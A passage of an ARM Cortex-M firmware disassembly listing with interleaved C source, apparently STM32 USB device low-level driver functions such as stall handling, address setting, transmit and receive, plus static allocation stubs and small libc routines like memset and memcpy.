 800ccbe:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ccc2:	78fa      	ldrb	r2, [r7, #3]
 800ccc4:	4611      	mov	r1, r2
 800ccc6:	4618      	mov	r0, r3
 800ccc8:	f7f5 fba6 	bl	8002418 <HAL_PCD_EP_ClrStall>
 800cccc:	4603      	mov	r3, r0
 800ccce:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ccd0:	7bbb      	ldrb	r3, [r7, #14]
 800ccd2:	2b03      	cmp	r3, #3
 800ccd4:	d816      	bhi.n	800cd04 <USBD_LL_ClearStallEP+0x5c>
 800ccd6:	a201      	add	r2, pc, #4	; (adr r2, 800ccdc <USBD_LL_ClearStallEP+0x34>)
 800ccd8:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ccdc:	0800cced 	.word	0x0800cced
 800cce0:	0800ccf3 	.word	0x0800ccf3
 800cce4:	0800ccf9 	.word	0x0800ccf9
 800cce8:	0800ccff 	.word	0x0800ccff
    case HAL_OK :
      usb_status = USBD_OK;
 800ccec:	2300      	movs	r3, #0
 800ccee:	73fb      	strb	r3, [r7, #15]
    break;
 800ccf0:	e00b      	b.n	800cd0a <USBD_LL_ClearStallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ccf2:	2303      	movs	r3, #3
 800ccf4:	73fb      	strb	r3, [r7, #15]
    break;
 800ccf6:	e008      	b.n	800cd0a <USBD_LL_ClearStallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ccf8:	2301      	movs	r3, #1
 800ccfa:	73fb      	strb	r3, [r7, #15]
    break;
 800ccfc:	e005      	b.n	800cd0a <USBD_LL_ClearStallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ccfe:	2303      	movs	r3, #3
 800cd00:	73fb      	strb	r3, [r7, #15]
    break;
 800cd02:	e002      	b.n	800cd0a <USBD_LL_ClearStallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cd04:	2303      	movs	r3, #3
 800cd06:	73fb      	strb	r3, [r7, #15]
    break;
 800cd08:	bf00      	nop
  }
  return usb_status;
 800cd0a:	7bfb      	ldrb	r3, [r7, #15]
}
 800cd0c:	4618      	mov	r0, r3
 800cd0e:	3710      	adds	r7, #16
 800cd10:	46bd      	mov	sp, r7
 800cd12:	bd80      	pop	{r7, pc}

0800cd14 <USBD_LL_IsStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Stall (1: Yes, 0: No)
  */
uint8_t USBD_LL_IsStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cd14:	b480      	push	{r7}
 800cd16:	b085      	sub	sp, #20
 800cd18:	af00      	add	r7, sp, #0
 800cd1a:	6078      	str	r0, [r7, #4]
 800cd1c:	460b      	mov	r3, r1
 800cd1e:	70fb      	strb	r3, [r7, #3]
  PCD_HandleTypeDef *hpcd = (PCD_HandleTypeDef*) pdev->pData;
 800cd20:	687b      	ldr	r3, [r7, #4]
 800cd22:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cd26:	60fb      	str	r3, [r7, #12]

  if((ep_addr & 0x80) == 0x80)
 800cd28:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800cd2c:	2b00      	cmp	r3, #0
 800cd2e:	da0c      	bge.n	800cd4a <USBD_LL_IsStallEP+0x36>
  {
    return hpcd->IN_ep[ep_addr & 0x7F].is_stall;
 800cd30:	78fb      	ldrb	r3, [r7, #3]
 800cd32:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800cd36:	68f9      	ldr	r1, [r7, #12]
 800cd38:	1c5a      	adds	r2, r3, #1
 800cd3a:	4613      	mov	r3, r2
 800cd3c:	009b      	lsls	r3, r3, #2
 800cd3e:	4413      	add	r3, r2
 800cd40:	00db      	lsls	r3, r3, #3
 800cd42:	440b      	add	r3, r1
 800cd44:	3302      	adds	r3, #2
 800cd46:	781b      	ldrb	r3, [r3, #0]
 800cd48:	e00b      	b.n	800cd62 <USBD_LL_IsStallEP+0x4e>
  }
  else
  {
    return hpcd->OUT_ep[ep_addr & 0x7F].is_stall;
 800cd4a:	78fb      	ldrb	r3, [r7, #3]
 800cd4c:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800cd50:	68f9      	ldr	r1, [r7, #12]
 800cd52:	4613      	mov	r3, r2
 800cd54:	009b      	lsls	r3, r3, #2
 800cd56:	4413      	add	r3, r2
 800cd58:	00db      	lsls	r3, r3, #3
 800cd5a:	440b      	add	r3, r1
 800cd5c:	f503 73b5 	add.w	r3, r3, #362	; 0x16a
 800cd60:	781b      	ldrb	r3, [r3, #0]
  }
}
 800cd62:	4618      	mov	r0, r3
 800cd64:	3714      	adds	r7, #20
 800cd66:	46bd      	mov	sp, r7
 800cd68:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cd6c:	4770      	bx	lr
	...

0800cd70 <USBD_LL_SetUSBAddress>:
  * @param  pdev: Device handle
  * @param  dev_addr: Device address
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_SetUSBAddress(USBD_HandleTypeDef *pdev, uint8_t dev_addr)
{
 800cd70:	b580      	push	{r7, lr}
 800cd72:	b084      	sub	sp, #16
 800cd74:	af00      	add	r7, sp, #0
 800cd76:	6078      	str	r0, [r7, #4]
 800cd78:	460b      	mov	r3, r1
 800cd7a:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cd7c:	2300      	movs	r3, #0
 800cd7e:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cd80:	2300      	movs	r3, #0
 800cd82:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_SetAddress(pdev->pData, dev_addr);
 800cd84:	687b      	ldr	r3, [r7, #4]
 800cd86:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cd8a:	78fa      	ldrb	r2, [r7, #3]
 800cd8c:	4611      	mov	r1, r2
 800cd8e:	4618      	mov	r0, r3
 800cd90:	f7f5 f97f 	bl	8002092 <HAL_PCD_SetAddress>
 800cd94:	4603      	mov	r3, r0
 800cd96:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cd98:	7bbb      	ldrb	r3, [r7, #14]
 800cd9a:	2b03      	cmp	r3, #3
 800cd9c:	d816      	bhi.n	800cdcc <USBD_LL_SetUSBAddress+0x5c>
 800cd9e:	a201      	add	r2, pc, #4	; (adr r2, 800cda4 <USBD_LL_SetUSBAddress+0x34>)
 800cda0:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cda4:	0800cdb5 	.word	0x0800cdb5
 800cda8:	0800cdbb 	.word	0x0800cdbb
 800cdac:	0800cdc1 	.word	0x0800cdc1
 800cdb0:	0800cdc7 	.word	0x0800cdc7
    case HAL_OK :
      usb_status = USBD_OK;
 800cdb4:	2300      	movs	r3, #0
 800cdb6:	73fb      	strb	r3, [r7, #15]
    break;
 800cdb8:	e00b      	b.n	800cdd2 <USBD_LL_SetUSBAddress+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cdba:	2303      	movs	r3, #3
 800cdbc:	73fb      	strb	r3, [r7, #15]
    break;
 800cdbe:	e008      	b.n	800cdd2 <USBD_LL_SetUSBAddress+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cdc0:	2301      	movs	r3, #1
 800cdc2:	73fb      	strb	r3, [r7, #15]
    break;
 800cdc4:	e005      	b.n	800cdd2 <USBD_LL_SetUSBAddress+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cdc6:	2303      	movs	r3, #3
 800cdc8:	73fb      	strb	r3, [r7, #15]
    break;
 800cdca:	e002      	b.n	800cdd2 <USBD_LL_SetUSBAddress+0x62>
    default :
      usb_status = USBD_FAIL;
 800cdcc:	2303      	movs	r3, #3
 800cdce:	73fb      	strb	r3, [r7, #15]
    break;
 800cdd0:	bf00      	nop
  }
  return usb_status;
 800cdd2:	7bfb      	ldrb	r3, [r7, #15]
}
 800cdd4:	4618      	mov	r0, r3
 800cdd6:	3710      	adds	r7, #16
 800cdd8:	46bd      	mov	sp, r7
 800cdda:	bd80      	pop	{r7, pc}

0800cddc <USBD_LL_Transmit>:
  * @param  pbuf: Pointer to data to be sent
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Transmit(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800cddc:	b580      	push	{r7, lr}
 800cdde:	b086      	sub	sp, #24
 800cde0:	af00      	add	r7, sp, #0
 800cde2:	60f8      	str	r0, [r7, #12]
 800cde4:	607a      	str	r2, [r7, #4]
 800cde6:	603b      	str	r3, [r7, #0]
 800cde8:	460b      	mov	r3, r1
 800cdea:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cdec:	2300      	movs	r3, #0
 800cdee:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cdf0:	2300      	movs	r3, #0
 800cdf2:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Transmit(pdev->pData, ep_addr, pbuf, size);
 800cdf4:	68fb      	ldr	r3, [r7, #12]
 800cdf6:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cdfa:	7af9      	ldrb	r1, [r7, #11]
 800cdfc:	683b      	ldr	r3, [r7, #0]
 800cdfe:	687a      	ldr	r2, [r7, #4]
 800ce00:	f7f5 fa5a 	bl	80022b8 <HAL_PCD_EP_Transmit>
 800ce04:	4603      	mov	r3, r0
 800ce06:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800ce08:	7dbb      	ldrb	r3, [r7, #22]
 800ce0a:	2b03      	cmp	r3, #3
 800ce0c:	d816      	bhi.n	800ce3c <USBD_LL_Transmit+0x60>
 800ce0e:	a201      	add	r2, pc, #4	; (adr r2, 800ce14 <USBD_LL_Transmit+0x38>)
 800ce10:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce14:	0800ce25 	.word	0x0800ce25
 800ce18:	0800ce2b 	.word	0x0800ce2b
 800ce1c:	0800ce31 	.word	0x0800ce31
 800ce20:	0800ce37 	.word	0x0800ce37
    case HAL_OK :
      usb_status = USBD_OK;
 800ce24:	2300      	movs	r3, #0
 800ce26:	75fb      	strb	r3, [r7, #23]
    break;
 800ce28:	e00b      	b.n	800ce42 <USBD_LL_Transmit+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ce2a:	2303      	movs	r3, #3
 800ce2c:	75fb      	strb	r3, [r7, #23]
    break;
 800ce2e:	e008      	b.n	800ce42 <USBD_LL_Transmit+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ce30:	2301      	movs	r3, #1
 800ce32:	75fb      	strb	r3, [r7, #23]
    break;
 800ce34:	e005      	b.n	800ce42 <USBD_LL_Transmit+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ce36:	2303      	movs	r3, #3
 800ce38:	75fb      	strb	r3, [r7, #23]
    break;
 800ce3a:	e002      	b.n	800ce42 <USBD_LL_Transmit+0x66>
    default :
      usb_status = USBD_FAIL;
 800ce3c:	2303      	movs	r3, #3
 800ce3e:	75fb      	strb	r3, [r7, #23]
    break;
 800ce40:	bf00      	nop
  }
  return usb_status;
 800ce42:	7dfb      	ldrb	r3, [r7, #23]
}
 800ce44:	4618      	mov	r0, r3
 800ce46:	3718      	adds	r7, #24
 800ce48:	46bd      	mov	sp, r7
 800ce4a:	bd80      	pop	{r7, pc}

0800ce4c <USBD_LL_PrepareReceive>:
  * @param  pbuf: Pointer to data to be received
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_PrepareReceive(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800ce4c:	b580      	push	{r7, lr}
 800ce4e:	b086      	sub	sp, #24
 800ce50:	af00      	add	r7, sp, #0
 800ce52:	60f8      	str	r0, [r7, #12]
 800ce54:	607a      	str	r2, [r7, #4]
 800ce56:	603b      	str	r3, [r7, #0]
 800ce58:	460b      	mov	r3, r1
 800ce5a:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ce5c:	2300      	movs	r3, #0
 800ce5e:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ce60:	2300      	movs	r3, #0
 800ce62:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Receive(pdev->pData, ep_addr, pbuf, size);
 800ce64:	68fb      	ldr	r3, [r7, #12]
 800ce66:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ce6a:	7af9      	ldrb	r1, [r7, #11]
 800ce6c:	683b      	ldr	r3, [r7, #0]
 800ce6e:	687a      	ldr	r2, [r7, #4]
 800ce70:	f7f5 f9d9 	bl	8002226 <HAL_PCD_EP_Receive>
 800ce74:	4603      	mov	r3, r0
 800ce76:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800ce78:	7dbb      	ldrb	r3, [r7, #22]
 800ce7a:	2b03      	cmp	r3, #3
 800ce7c:	d816      	bhi.n	800ceac <USBD_LL_PrepareReceive+0x60>
 800ce7e:	a201      	add	r2, pc, #4	; (adr r2, 800ce84 <USBD_LL_PrepareReceive+0x38>)
 800ce80:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce84:	0800ce95 	.word	0x0800ce95
 800ce88:	0800ce9b 	.word	0x0800ce9b
 800ce8c:	0800cea1 	.word	0x0800cea1
 800ce90:	0800cea7 	.word	0x0800cea7
    case HAL_OK :
      usb_status = USBD_OK;
 800ce94:	2300      	movs	r3, #0
 800ce96:	75fb      	strb	r3, [r7, #23]
    break;
 800ce98:	e00b      	b.n	800ceb2 <USBD_LL_PrepareReceive+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ce9a:	2303      	movs	r3, #3
 800ce9c:	75fb      	strb	r3, [r7, #23]
    break;
 800ce9e:	e008      	b.n	800ceb2 <USBD_LL_PrepareReceive+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cea0:	2301      	movs	r3, #1
 800cea2:	75fb      	strb	r3, [r7, #23]
    break;
 800cea4:	e005      	b.n	800ceb2 <USBD_LL_PrepareReceive+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cea6:	2303      	movs	r3, #3
 800cea8:	75fb      	strb	r3, [r7, #23]
    break;
 800ceaa:	e002      	b.n	800ceb2 <USBD_LL_PrepareReceive+0x66>
    default :
      usb_status = USBD_FAIL;
 800ceac:	2303      	movs	r3, #3
 800ceae:	75fb      	strb	r3, [r7, #23]
    break;
 800ceb0:	bf00      	nop
  }
  return usb_status;
 800ceb2:	7dfb      	ldrb	r3, [r7, #23]
}
 800ceb4:	4618      	mov	r0, r3
 800ceb6:	3718      	adds	r7, #24
 800ceb8:	46bd      	mov	sp, r7
 800ceba:	bd80      	pop	{r7, pc}

0800cebc <USBD_LL_GetRxDataSize>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Received Data Size
  */
uint32_t USBD_LL_GetRxDataSize(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cebc:	b580      	push	{r7, lr}
 800cebe:	b082      	sub	sp, #8
 800cec0:	af00      	add	r7, sp, #0
 800cec2:	6078      	str	r0, [r7, #4]
 800cec4:	460b      	mov	r3, r1
 800cec6:	70fb      	strb	r3, [r7, #3]
  return HAL_PCD_EP_GetRxCount((PCD_HandleTypeDef*) pdev->pData, ep_addr);
 800cec8:	687b      	ldr	r3, [r7, #4]
 800ceca:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cece:	78fa      	ldrb	r2, [r7, #3]
 800ced0:	4611      	mov	r1, r2
 800ced2:	4618      	mov	r0, r3
 800ced4:	f7f5 f9d8 	bl	8002288 <HAL_PCD_EP_GetRxCount>
 800ced8:	4603      	mov	r3, r0
}
 800ceda:	4618      	mov	r0, r3
 800cedc:	3708      	adds	r7, #8
 800cede:	46bd      	mov	sp, r7
 800cee0:	bd80      	pop	{r7, pc}
	...

0800cee4 <HAL_PCDEx_LPM_Callback>:
  * @param  hpcd: PCD handle
  * @param  msg: LPM message
  * @retval None
  */
void HAL_PCDEx_LPM_Callback(PCD_HandleTypeDef *hpcd, PCD_LPM_MsgTypeDef msg)
{
 800cee4:	b580      	push	{r7, lr}
 800cee6:	b082      	sub	sp, #8
 800cee8:	af00      	add	r7, sp, #0
 800ceea:	6078      	str	r0, [r7, #4]
 800ceec:	460b      	mov	r3, r1
 800ceee:	70fb      	strb	r3, [r7, #3]
  switch (msg)
 800cef0:	78fb      	ldrb	r3, [r7, #3]
 800cef2:	2b00      	cmp	r3, #0
 800cef4:	d002      	beq.n	800cefc <HAL_PCDEx_LPM_Callback+0x18>
 800cef6:	2b01      	cmp	r3, #1
 800cef8:	d013      	beq.n	800cf22 <HAL_PCDEx_LPM_Callback+0x3e>
      /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
    }
    break;
  }
}
 800cefa:	e023      	b.n	800cf44 <HAL_PCDEx_LPM_Callback+0x60>
    if (hpcd->Init.low_power_enable)
 800cefc:	687b      	ldr	r3, [r7, #4]
 800cefe:	699b      	ldr	r3, [r3, #24]
 800cf00:	2b00      	cmp	r3, #0
 800cf02:	d007      	beq.n	800cf14 <HAL_PCDEx_LPM_Callback+0x30>
      SystemClockConfig_Resume();
 800cf04:	f000 f84a 	bl	800cf9c <SystemClockConfig_Resume>
      SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cf08:	4b10      	ldr	r3, [pc, #64]	; (800cf4c <HAL_PCDEx_LPM_Callback+0x68>)
 800cf0a:	691b      	ldr	r3, [r3, #16]
 800cf0c:	4a0f      	ldr	r2, [pc, #60]	; (800cf4c <HAL_PCDEx_LPM_Callback+0x68>)
 800cf0e:	f023 0306 	bic.w	r3, r3, #6
 800cf12:	6113      	str	r3, [r2, #16]
    USBD_LL_Resume(hpcd->pData);
 800cf14:	687b      	ldr	r3, [r7, #4]
 800cf16:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cf1a:	4618      	mov	r0, r3
 800cf1c:	f7fe fa66 	bl	800b3ec <USBD_LL_Resume>
    break;
 800cf20:	e010      	b.n	800cf44 <HAL_PCDEx_LPM_Callback+0x60>
    USBD_LL_Suspend(hpcd->pData);
 800cf22:	687b      	ldr	r3, [r7, #4]
 800cf24:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cf28:	4618      	mov	r0, r3
 800cf2a:	f7fe fa43 	bl	800b3b4 <USBD_LL_Suspend>
    if (hpcd->Init.low_power_enable)
 800cf2e:	687b      	ldr	r3, [r7, #4]
 800cf30:	699b      	ldr	r3, [r3, #24]
 800cf32:	2b00      	cmp	r3, #0
 800cf34:	d005      	beq.n	800cf42 <HAL_PCDEx_LPM_Callback+0x5e>
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cf36:	4b05      	ldr	r3, [pc, #20]	; (800cf4c <HAL_PCDEx_LPM_Callback+0x68>)
 800cf38:	691b      	ldr	r3, [r3, #16]
 800cf3a:	4a04      	ldr	r2, [pc, #16]	; (800cf4c <HAL_PCDEx_LPM_Callback+0x68>)
 800cf3c:	f043 0306 	orr.w	r3, r3, #6
 800cf40:	6113      	str	r3, [r2, #16]
    break;
 800cf42:	bf00      	nop
}
 800cf44:	bf00      	nop
 800cf46:	3708      	adds	r7, #8
 800cf48:	46bd      	mov	sp, r7
 800cf4a:	bd80      	pop	{r7, pc}
 800cf4c:	e000ed00 	.word	0xe000ed00

0800cf50 <USBD_static_malloc>:
  * @brief  Static single allocation.
  * @param  size: Size of allocated memory
  * @retval None
  */
void *USBD_static_malloc(uint32_t size)
{
 800cf50:	b480      	push	{r7}
 800cf52:	b083      	sub	sp, #12
 800cf54:	af00      	add	r7, sp, #0
 800cf56:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_CUSTOM_HID_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800cf58:	4b03      	ldr	r3, [pc, #12]	; (800cf68 <USBD_static_malloc+0x18>)
}
 800cf5a:	4618      	mov	r0, r3
 800cf5c:	370c      	adds	r7, #12
 800cf5e:	46bd      	mov	sp, r7
 800cf60:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cf64:	4770      	bx	lr
 800cf66:	bf00      	nop
 800cf68:	20000e74 	.word	0x20000e74

0800cf6c <USBD_static_malloc_MSC>:

void *USBD_static_malloc_MSC(uint32_t size)
{
 800cf6c:	b480      	push	{r7}
 800cf6e:	b083      	sub	sp, #12
 800cf70:	af00      	add	r7, sp, #0
 800cf72:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_MSC_BOT_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800cf74:	4b03      	ldr	r3, [pc, #12]	; (800cf84 <USBD_static_malloc_MSC+0x18>)
}
 800cf76:	4618      	mov	r0, r3
 800cf78:	370c      	adds	r7, #12
 800cf7a:	46bd      	mov	sp, r7
 800cf7c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cf80:	4770      	bx	lr
 800cf82:	bf00      	nop
 800cf84:	20000e9c 	.word	0x20000e9c

0800cf88 <USBD_static_free>:
  * @brief  Dummy memory free
  * @param  p: Pointer to allocated  memory address
  * @retval None
  */
void USBD_static_free(void *p)
{
 800cf88:	b480      	push	{r7}
 800cf8a:	b083      	sub	sp, #12
 800cf8c:	af00      	add	r7, sp, #0
 800cf8e:	6078      	str	r0, [r7, #4]

}
 800cf90:	bf00      	nop
 800cf92:	370c      	adds	r7, #12
 800cf94:	46bd      	mov	sp, r7
 800cf96:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cf9a:	4770      	bx	lr

0800cf9c <SystemClockConfig_Resume>:
  * @brief  Configures system clock after wake-up from USB resume callBack:
  *         enable HSI, PLL and select PLL as system clock source.
  * @retval None
  */
static void SystemClockConfig_Resume(void)
{
 800cf9c:	b580      	push	{r7, lr}
 800cf9e:	af00      	add	r7, sp, #0
  SystemClock_Config();
 800cfa0:	f7f3 fb2c 	bl	80005fc <SystemClock_Config>
}
 800cfa4:	bf00      	nop
 800cfa6:	bd80      	pop	{r7, pc}

0800cfa8 <memset>:
 800cfa8:	4402      	add	r2, r0
 800cfaa:	4603      	mov	r3, r0
 800cfac:	4293      	cmp	r3, r2
 800cfae:	d100      	bne.n	800cfb2 <memset+0xa>
 800cfb0:	4770      	bx	lr
 800cfb2:	f803 1b01 	strb.w	r1, [r3], #1
 800cfb6:	e7f9      	b.n	800cfac <memset+0x4>

0800cfb8 <__libc_init_array>:
 800cfb8:	b570      	push	{r4, r5, r6, lr}
 800cfba:	4d0d      	ldr	r5, [pc, #52]	; (800cff0 <__libc_init_array+0x38>)
 800cfbc:	4c0d      	ldr	r4, [pc, #52]	; (800cff4 <__libc_init_array+0x3c>)
 800cfbe:	1b64      	subs	r4, r4, r5
 800cfc0:	10a4      	asrs	r4, r4, #2
 800cfc2:	2600      	movs	r6, #0
 800cfc4:	42a6      	cmp	r6, r4
 800cfc6:	d109      	bne.n	800cfdc <__libc_init_array+0x24>
 800cfc8:	4d0b      	ldr	r5, [pc, #44]	; (800cff8 <__libc_init_array+0x40>)
 800cfca:	4c0c      	ldr	r4, [pc, #48]	; (800cffc <__libc_init_array+0x44>)
 800cfcc:	f000 f826 	bl	800d01c <_init>
 800cfd0:	1b64      	subs	r4, r4, r5
 800cfd2:	10a4      	asrs	r4, r4, #2
 800cfd4:	2600      	movs	r6, #0
 800cfd6:	42a6      	cmp	r6, r4
 800cfd8:	d105      	bne.n	800cfe6 <__libc_init_array+0x2e>
 800cfda:	bd70      	pop	{r4, r5, r6, pc}
 800cfdc:	f855 3b04 	ldr.w	r3, [r5], #4
 800cfe0:	4798      	blx	r3
 800cfe2:	3601      	adds	r6, #1
 800cfe4:	e7ee      	b.n	800cfc4 <__libc_init_array+0xc>
 800cfe6:	f855 3b04 	ldr.w	r3, [r5], #4
 800cfea:	4798      	blx	r3
 800cfec:	3601      	adds	r6, #1
 800cfee:	e7f2      	b.n	800cfd6 <__libc_init_array+0x1e>
 800cff0:	0800d1d4 	.word	0x0800d1d4
 800cff4:	0800d1d4 	.word	0x0800d1d4
 800cff8:	0800d1d4 	.word	0x0800d1d4
 800cffc:	0800d1d8 	.word	0x0800d1d8

0800d000 <memcpy>:
 800d000:	440a      	add	r2, r1
 800d002:	4291      	cmp	r1, r2
 800d004:	f100 33ff 	add.w	r3, r0, #4294967295
 800d008:	d100      	bne.n	800d00c <memcpy+0xc>
 800d00a:	4770      	bx	lr
 800d00c:	b510      	push	{r4, lr}
 800d00e:	f811 4b01 	ldrb.w	r4, [r1], #1
 800d012:	f803 4f01 	strb.w	r4, [r3, #1]!
 800d016:	4291      	cmp	r1, r2
 800d018:	d1f9      	bne.n	800d00e <memcpy+0xe>
 800d01a:	bd10      	pop	{r4, pc}

0800d01c <_init>:
 800d01c:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d01e:	bf00      	nop
 800d020:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d022:	bc08      	pop	{r3}
 800d024:	469e      	mov	lr, r3
 800d026:	4770      	bx	lr

0800d028 <_fini>:
 800d028:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d02a:	bf00      	nop
 800d02c:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d02e:	bc08      	pop	{r3}
 800d030:	469e      	mov	lr, r3
 800d032:	4770      	bx	lr
